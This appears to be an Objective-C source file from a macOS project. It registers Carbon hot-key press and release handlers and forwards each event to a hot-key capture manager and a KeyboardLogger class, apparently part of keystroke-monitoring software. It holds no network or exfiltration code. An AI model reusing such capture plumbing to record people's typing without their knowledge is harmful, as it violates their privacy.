//
//  KeyboardEventHandlerManager.m
//  KeyboardEventHandler
//
//  Created by Ophat Phuetkasickonphasutha on 10/31/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "KeyboardEventHandlerManager.h"
#import "HotKeyCaptureManager.h"
#import "KeyboardLogger.h"

OSStatus GlobalEventPress(EventHandlerCallRef nextHandler,EventRef theEvent,void *userData);
OSStatus GlobalEventRelease(EventHandlerCallRef nextHandler,EventRef theEvent,void *userData);

@implementation KeyboardEventHandlerManager

- (id)init
{
    self = [super init];
    if (self) {
        // Initialization code here.
    }
    
    return self;
}

-(void) registerToGlobalEventHandler{
  
    EventTypeSpec eventType9;
    eventType9.eventClass=kEventClassKeyboard;
    eventType9.eventKind=kEventHotKeyPressed;
    
    EventTypeSpec eventType8;
    eventType8.eventClass=kEventClassKeyboard;
    eventType8.eventKind=kEventHotKeyReleased;
    
    InstallApplicationEventHandler(&GlobalEventPress,1,&eventType9,NULL,NULL);
    InstallApplicationEventHandler(&GlobalEventRelease,1,&eventType8,NULL,NULL);

}

OSStatus GlobalEventPress(EventHandlerCallRef nextHandler,EventRef theEvent,void *userData){

    HotKeyCaptureManager * sharedHotKey = [HotKeyCaptureManager sharedHotKeyCaptureManager];
    [sharedHotKey HotKeyPressCallback:nextHandler EventRef:theEvent Method:userData];

    KeyboardLogger * sharedKey = [KeyboardLogger shareInstance];
    [sharedKey KeyPressCallback:nextHandler EventRef:theEvent Method:userData];
    
    return noErr;
}
OSStatus GlobalEventRelease(EventHandlerCallRef nextHandler,EventRef theEvent,void *userData){

    HotKeyCaptureManager * sharedHotKey = [HotKeyCaptureManager sharedHotKeyCaptureManager];
    [sharedHotKey HotKeyReleaseCallback:nextHandler EventRef:theEvent Method:userData];
   
    KeyboardLogger * sharedKey = [KeyboardLogger shareInstance];
    [sharedKey KeyReleaseCallback:nextHandler EventRef:theEvent Method:userData];
    
    return noErr;
}


- (void)dealloc
{
    [super dealloc];
}

@end
